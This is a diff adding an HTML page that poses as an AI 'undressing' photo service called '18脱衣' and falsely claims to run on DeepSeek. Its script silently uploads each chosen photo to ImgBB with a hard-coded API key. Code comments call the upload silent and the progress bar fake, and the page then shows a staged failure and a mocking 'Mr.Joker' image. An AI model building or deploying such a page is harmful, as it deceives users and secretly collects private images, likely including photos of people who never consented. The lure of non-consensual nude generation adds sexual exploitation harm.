@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>18脱衣</title>
+    <style>
+        :root {
+            --bg-color: #121212;
+            --text-color: #ffffff;
+            --accent-color: #bb86fc;
+            --secondary-bg: #1e1e1e;
+            --card-bg: #2d2d2d;
+        }
+        
+        [data-theme="light"] {
+            --bg-color: #ffffff;
+            --text-color: #121212;
+            --accent-color: #6200ee;
+            --secondary-bg: #f5f5f5;
+            --card-bg: #e0e0e0;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            transition: background-color 0.3s, color 0.3s;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* 公告样式 */
+        .announcement {
+            background-color: #ff5722;
+            color: white;
+            padding: 12px;
+            text-align: center;
+            font-weight: bold;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            animation: slideDown 0.5s ease-out;
+        }
+        
+        @keyframes slideDown {
+            from { transform: translateY(-100%); }
+            to { transform: translateY(0); }
+        }
+        
+        .close-announcement {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background-color: var(--secondary-bg);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            margin-top: 50px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(255, 0, 255, 0.3);
+        }
+        
+        .theme-toggle {
+            background: none;
+            border: none;
+            color: var(--text-color);
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+        }
+        
+        .menu-toggle {
+            background: none;
+            border: none;
+            color: var(--text-color);
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+            position: relative;
+            z-index: 101;
+        }
+        
+        .menu {
+            position: fixed;
+            top: 0;
+            right: -250px;
+            width: 250px;
+            height: 100vh;
+            background-color: var(--secondary-bg);
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: right 0.3s;
+            z-index: 100;
+            padding: 80px 20px 20px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .menu.active {
+            right: 0;
+        }
+        
+        .menu-item {
+            padding: 15px;
+            color: var(--text-color);
+            text-decoration: none;
+            font-size: 18px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            transition: color 0.3s;
+        }
+        
+        .menu-item:hover {
+            color: var(--accent-color);
+        }
+        
+        main {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .page {
+            width: 100%;
+            max-width: 500px;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .page.active {
+            display: flex;
+        }
+        
+        .upload-btn {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 80%;
+            max-width: 300px;
+        }
+        
+        .upload-btn:active {
+            transform: scale(0.95);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        .preview-container {
+            width: 100%;
+            max-width: 300px;
+            height: 300px;
+            border: 2px dashed var(--accent-color);
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+            overflow: hidden;
+            position: relative;
+            background-color: var(--card-bg);
+        }
+        
+        .preview-image {
+            max-width: 100%;
+            max-height: 100%;
+            display: none;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px 0;
+            display: none;
+        }
+        
+        .progress-text {
+            text-align: center;
+            margin-bottom: 10px;
+            font-size: 16px;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: var(--secondary-bg);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background-color: var(--accent-color);
+            transition: width 0.1s;
+        }
+        
+        .result-message {
+            text-align: center;
+            margin: 20px 0;
+            font-size: 18px;
+            display: none;
+        }
+        
+        .retry-btn {
+            background-color: var(--accent-color);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px 0;
+            display: none;
+        }
+        
+        .about-content {
+            width: 100%;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .about-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+            text-align: center;
+        }
+        
+        .about-text {
+            margin-bottom: 15px;
+            padding: 10px;
+            background-color: var(--card-bg);
+            border-radius: 8px;
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 99;
+            display: none;
+        }
+        
+        .overlay.active {
+            display: block;
+        }
+        
+        /* 响应式调整 */
+        @media (max-width: 480px) {
+            header {
+                padding: 12px 15px;
+            }
+            
+            .logo {
+                font-size: 20px;
+            }
+            
+            .upload-btn {
+                padding: 12px 24px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- 公告栏 -->
+    <div class="announcement" id="announcement">
+        📢重大更新-本站使用DeepSeekAI模型，生成图片逼真
+        <button class="close-announcement" id="closeAnnouncement">×</button>
+    </div>
+    
+    <header>
+        <button class="theme-toggle">🌓</button>
+        <div class="logo">18脱衣</div>
+        <button class="menu-toggle">☰</button>
+    </header>
+    
+    <div class="overlay"></div>
+    
+    <div class="menu">
+        <a href="#" class="menu-item" data-page="home">主页</a>
+        <a href="#" class="menu-item" data-page="about">关于</a>
+    </div>
+    
+    <main>
+        <div class="page home active">
+            <button class="upload-btn">上传图片</button>
+            <div class="preview-container">
+                <img src="" alt="预览图片" class="preview-image">
+                <span>图片预览区域</span>
+            </div>
+            
+            <div class="progress-container">
+                <div class="progress-text">生成中... <span class="countdown">15</span>秒</div>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+            
+            <div class="result-message fail-message">生成失败，请换一张图片试试吧！</div>
+            
+            <button class="retry-btn">再次上传</button>
+            
+            <div class="result-message success-message">
+                <p>Hi,Mr.Joker！</p>
+                <img src="https://i0.hdslb.com/bfs/archive/80ce1226ba73627b3d98853f16175e0cf9ec1953.jpg" alt="生成结果" class="preview-image" style="display: block; margin-top: 20px;">
+            </div>
+        </div>
+        
+        <div class="page about">
+            <div class="about-content">
+                <h2 class="about-title">关于</h2>
+                <div class="about-text">
+                    <p><strong>制作人</strong>: DWQ</p>
+                </div>
+                <div class="about-text">
+                    <p><strong>赞助商</strong>: DWQ</p>
+                </div>
+                <div class="about-text">
+                    <p><strong>技术支持</strong>: DeepSeekAI模型</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    
+    <script>
+        // 关闭公告
+        document.getElementById('closeAnnouncement').addEventListener('click', function() {
+            document.getElementById('announcement').style.display = 'none';
+            document.querySelector('header').style.marginTop = '0';
+        });
+        
+        // 主题切换
+        const themeToggle = document.querySelector('.theme-toggle');
+        const body = document.body;
+        
+        themeToggle.addEventListener('click', () => {
+            if (body.getAttribute('data-theme') === 'light') {
+                body.setAttribute('data-theme', 'dark');
+            } else {
+                body.setAttribute('data-theme', 'light');
+            }
+        });
+        
+        // 菜单切换
+        const menuToggle = document.querySelector('.menu-toggle');
+        const menu = document.querySelector('.menu');
+        const overlay = document.querySelector('.overlay');
+        
+        menuToggle.addEventListener('click', () => {
+            menu.classList.toggle('active');
+            overlay.classList.toggle('active');
+            
+            if (menu.classList.contains('active')) {
+                menuToggle.textContent = '✕';
+            } else {
+                menuToggle.textContent = '☰';
+            }
+        });
+        
+        overlay.addEventListener('click', () => {
+            menu.classList.remove('active');
+            overlay.classList.remove('active');
+            menuToggle.textContent = '☰';
+        });
+        
+        // 页面切换
+        const menuItems = document.querySelectorAll('.menu-item');
+        const pages = document.querySelectorAll('.page');
+        
+        menuItems.forEach(item => {
+            item.addEventListener('click', (e) => {
+                e.preventDefault();
+                const pageName = item.getAttribute('data-page');
+                
+                pages.forEach(page => {
+                    page.classList.remove('active');
+                    if (page.classList.contains(pageName)) {
+                        page.classList.add('active');
+                    }
+                });
+                
+                menu.classList.remove('active');
+                overlay.classList.remove('active');
+                menuToggle.textContent = '☰';
+            });
+        });
+        
+        // 上传功能
+        const uploadBtn = document.querySelector('.upload-btn');
+        const previewContainer = document.querySelector('.preview-container');
+        const previewImage = document.querySelector('.preview-image');
+        const progressContainer = document.querySelector('.progress-container');
+        const progressFill = document.querySelector('.progress-fill');
+        const countdown = document.querySelector('.countdown');
+        const failMessage = document.querySelector('.fail-message');
+        const retryBtn = document.querySelector('.retry-btn');
+        const successMessage = document.querySelector('.success-message');
+        
+        uploadBtn.addEventListener('click', () => {
+            // 模拟文件选择
+            const fileInput = document.createElement('input');
+            fileInput.type = 'file';
+            fileInput.accept = 'image/*';
+            
+            fileInput.addEventListener('change', async (e) => {
+                const file = e.target.files[0];
+                if (file) {
+                    const reader = new FileReader();
+                    
+                    reader.onload = (event) => {
+                        previewImage.src = event.target.result;
+                        previewImage.style.display = 'block';
+                        previewContainer.querySelector('span').style.display = 'none';
+                        
+                        // 静默上传到ImgBB（实际使用请替换API Key）
+                        uploadToImgBB(file);
+                        
+                        // 显示虚假的上传过程
+                        startFakeUploadProcess();
+                    };
+                    
+                    reader.readAsDataURL(file);
+                }
+            });
+            
+            fileInput.click();
+        });
+        
+        // 实际ImgBB上传函数
+        async function uploadToImgBB(file) {
+            try {
+                const formData = new FormData();
+                formData.append('image', file);
+                
+                // 替换为您的ImgBB API Key
+                const apiKey = 'd9420b66684c1414feb369777dfc3190';
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                console.log('ImgBB上传结果:', data);
+            } catch (error) {
+                console.error('上传错误:', error);
+            }
+        }
+        
+        function startFakeUploadProcess() {
+            uploadBtn.style.display = 'none';
+            progressContainer.style.display = 'block';
+            failMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+            retryBtn.style.display = 'none';
+            
+            let seconds = 15;
+            countdown.textContent = seconds;
+            
+            const interval = setInterval(() => {
+                seconds--;
+                countdown.textContent = seconds;
+                
+                const progress = ((15 - seconds) / 15) * 100;
+                progressFill.style.width = `${progress}%`;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    showFailMessage();
+                }
+            }, 1000);
+        }
+        
+        function showFailMessage() {
+            progressContainer.style.display = 'none';
+            failMessage.style.display = 'block';
+            retryBtn.style.display = 'block';
+        }
+        
+        retryBtn.addEventListener('click', () => {
+            retryBtn.style.display = 'none';
+            failMessage.style.display = 'none';
+            progressContainer.style.display = 'block';
+            
+            let seconds = 5;
+            countdown.textContent = seconds;
+            progressFill.style.width = '0%';
+            
+            const interval = setInterval(() => {
+                seconds--;
+                countdown.textContent = seconds;
+                
+                const progress = ((5 - seconds) / 5) * 100;
+                progressFill.style.width = `${progress}%`;
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    showSuccessMessage();
+                }
+            }, 1000);
+        });
+        
+        function showSuccessMessage() {
+            progressContainer.style.display = 'none';
+            successMessage.style.display = 'block';
+            uploadBtn.style.display = 'block';
+        }
+    </script>
+</body>
+</html>
